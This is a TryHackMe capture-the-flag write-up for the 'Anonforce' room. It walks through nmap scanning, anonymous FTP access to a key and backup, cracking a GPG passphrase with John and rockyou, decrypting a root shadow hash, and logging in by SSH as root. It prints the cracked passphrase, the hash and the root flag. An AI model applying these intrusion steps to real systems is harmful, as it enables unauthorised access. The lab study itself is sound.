Anonforce - Boot2Root (FIT & BSides Guatemala CTF)
TryHackMe

## Overview
Goal: enumerate services, grab the user flag, recover credentials, and access root.

## Step 1 - Enumeration
Initial scan:

```bash
nmap -sC -sV <TARGET_IP>
```

Key findings (trimmed):

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 1000 1000 4096 Aug 11  2019 notread [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

FTP allows anonymous login and exposes a writeable directory. SSH is also available.

## Step 2 - Anonymous FTP and user flag
Log in and enumerate the filesystem:

```text
ftp <TARGET_IP>
Name: anonymous
Password: (blank)
```

Navigate to the user's home and grab the flag:

```text
ftp> cd /home/melodias
ftp> get user.txt
```

The shareable directory contains encrypted material:

```text
ftp> cd /notread
ftp> get backup.pgp
ftp> get private.asc
```

## Step 3 - Decrypt backup and recover root hash
Convert the GPG private key to a John hash and crack it with rockyou:

```bash
/usr/sbin/gpg2john private.asc > privatehash
/usr/sbin/john privatehash --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```text
xbox360 (anonforce)
```

Import the key and decrypt the backup file:

```bash
gpg --import private.asc
gpg -d backup.pgp
```

Decryption yields a shadow file snippet containing the root hash:

```text
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
```

## Step 4 - SSH as root and grab the flag
Use the recovered root password (from the cracked hash) to log in:

```bash
ssh root@<TARGET_IP>
```

Then read the root flag:

```bash
cat /root/root.txt
```

Root flag (from this run):

```
f706456440c7af4187810c31c6cebdce
```
